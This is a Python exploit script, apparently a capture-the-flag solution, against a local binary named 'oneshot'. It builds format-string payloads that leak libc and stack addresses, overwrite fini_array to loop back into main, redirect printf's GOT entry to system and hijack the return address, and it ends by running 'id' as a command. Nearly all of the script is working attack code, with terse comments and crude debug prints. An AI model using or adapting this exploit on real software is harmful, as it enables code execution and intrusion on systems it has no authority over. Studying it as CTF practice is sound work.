#! env python3

import subprocess, signal, os
from fcntl import fcntl, F_GETFL, F_SETFL

from ropgadget.args import Args
from ropgadget.core import Core

def preexec_tmux_gdb_attach():
    tmux_command = "tmux send-keys -t {target:s} attach {pid:d} Enter"
    tmux_target = "base:9.2" # session:window.pane
    #tmux_target = "2" # or just the pane
    subprocess.check_output(["tmux", "send-keys", "-t", tmux_target, "attach {:n}".format(os.getpid()), "Enter"])

class RopHelper:

    def __init__(self, binary):
        self._rg_core = Core(Args(['--binary', binary, '--silent']).getArgs())
        self._rg_core.analyze()

    def find_gadget(self, gadget):
        for g in self._rg_core.gadgets():
            if g['gadget'] == '{:s} ; ret'.format(gadget):
                return g['vaddr']
        return None


class Process:
    def __init__(self, command, gdb=False):
        env = os.environ.copy()
        #env['LD_LIBRARY_PATH'] = os.getcwd()

        if gdb:
            # https://stackoverflow.com/a/50003663
            preexec_fn = preexec_tmux_gdb_attach
        else:
            preexec_fn = None

        # https://docs.python.org/3/library/subprocess.html#subprocess.Popen
        self.p = subprocess.Popen(command,
                                  stdout=subprocess.PIPE,
                                  stdin=subprocess.PIPE,
                                  bufsize=0,
                                  env=env,
                                  shell=False)

        self._original_flags = fcntl(self.p.stdout, F_GETFL)
        self.setblocking(False)

        if gdb:
            print("new process pid: {:d}".format(self.p.pid))
            self.wait("attach with gdb and press enter")

    def wait(self, message=None):
        if not message:
            message = "press enter to continue"
        input(message)

    def recvuntil(self, data):
        if type(data) in [bytes, bytearray]:
            bdata = data
        else:
            bdata = data.encode('utf-8')

        brecv = b''
        while not brecv.endswith(bdata):
            b = self.p.stdout.read(1)
            if b is not None:
                brecv += b

        if type(data) in [bytes, bytearray]:
            return brecv
        else:
            return brecv.decode('utf-8')

    def recv(self, size):
        return self.p.stdout.read(size)

    def send(self, data):
        if type(data) in [bytes, bytearray]:
            self.p.stdin.write(data)
        else:
            self.p.stdin.write(data.encode('utf-8'))

    def setblocking(self, mode):
        # http://eyalarubas.com/python-subproc-nonblock.html
        if mode == False:
            fcntl(self.p.stdout, F_SETFL, self._original_flags | os.O_NONBLOCK)
        else:
            fcntl(self.p.stdout, F_SETFL, self._original_flags)


target = Process(['./oneshot'], gdb=True)

# leak the address of printf in libc and
# change the fini_array to return to main and
# change setbuf@plt to call main
payload  = (
    '%{:d}$s' +
    'a' * (0x10 - 7 + 1) + '%{:d}$hhn' +
    'a' * (0x40 - 0x10) + '%{:d}$hhn' +
    'a' * (0x70 - 0x40) + '%{:d}$hhn' +
    '%{:d}$016lx' +
    'p' * (0x308 -
        6 -
        (0x10 - 7 + 1) - 8 -
        (0x40 - 0x10) - 8 -
        (0x70 - 0x40) - 8 -
        10
    )
).format(
    0x308 // 8 + 6,
    0x308 // 8 + 6 + 1,
    0x308 // 8 + 6 + 2,
    0x308 // 8 + 6 + 3,
    0x4d0 // 8 + 6
).encode('utf-8')

payload += 0x403388.to_bytes(8, 'little') # printf address in libc in memory

# write the addresses 0x401070 (main) at 0x403168 (fini_array)
# we write the address in order
# 0x10
payload += 0x403169.to_bytes(8, 'little')
# 0x40
payload += 0x40316a.to_bytes(8, 'little')
# 0x70
payload += 0x403168.to_bytes(8, 'little')


# search for \n in payload which can trigger the exploit prematurely
if b'\n' in payload:
    print('fuck')
    exit(1)

# read garbage
target.send(payload + b'\n')
target.recvuntil('SERVICE\n')
target.wait('first payload')
# read the addr of printf
addr_printf = int.from_bytes(target.recv(6), 'little')
# read more garbage
target.recvuntil('aa0000')
# read the stack hint
hint_stack = int(target.recv(12).decode('utf-8'), 16) - 1240
# calculate the address of system in libc
addr_system = addr_printf - (0x64e80 - 0x4f440)

print('found printf at {}'.format(hex(addr_printf)))
print('calculated system at {}'.format(hex(addr_system)))
print('stack hint is {}'.format(hex(hint_stack)))

# change printf for system
# we only need to change the 3 least significat bytes
addr_system_bytes = addr_system.to_bytes(8, 'little')
b1 = addr_system_bytes[0]
b2 = addr_system_bytes[1]
b3 = addr_system_bytes[2]

writes = [
    (b1,    0x403388),
    (b2,    0x403389),
    (b3,    0x40338a),
    (0x10,  hint_stack - 0xf0 + 1 + 0x408),
    (0x40,  hint_stack - 0xf0 + 2 + 0x408),
    (0xba,  hint_stack - 0xf0 + 0 + 0x408)
]

writes = sorted(writes, key=lambda item: item[0])

# zeros
payload = (
    '%{:d}$hhn' * 5
).format(
    0x200 // 8 + 6 + 0,
    0x200 // 8 + 6 + 1,
    0x200 // 8 + 6 + 2,
    0x200 // 8 + 6 + 3,
    0x200 // 8 + 6 + 4
)
count_p = 0x200 - 7 * 5

prev = 0
for idx, w in enumerate(writes):
    specifier = '%{:d}$hhn'.format(0x200 // 8 + 6 + 5 + idx)
    payload += 'a' * (w[0] - prev) + specifier
    count_p = count_p - (w[0] - prev) - len(specifier)
    prev = w[0]

if count_p < 0:
    print("shit")
    exit(0)

payload += 'p' * count_p

payload = payload.encode('utf-8')

# return address
# zeros
payload += ((hint_stack - 0xf0 + 3) + 0x408).to_bytes(8, 'little')
payload += ((hint_stack - 0xf0 + 4) + 0x408).to_bytes(8, 'little')
payload += ((hint_stack - 0xf0 + 5) + 0x408).to_bytes(8, 'little')
payload += ((hint_stack - 0xf0 + 6) + 0x408).to_bytes(8, 'little')
payload += ((hint_stack - 0xf0 + 7) + 0x408).to_bytes(8, 'little')
for w in writes:
    payload += w[1].to_bytes(8, 'little')

# search for \n in payload which can trigger the exploit prematurely
if b'\n' in payload:
    print('fuck')
    exit(1)

target.send(payload + b'\n')
target.wait('second payload')
target.recv(0x1000)

# run the command
target.wait('third payload - the command')
target.send('id\n')
target.wait()
print(target.recv(100))
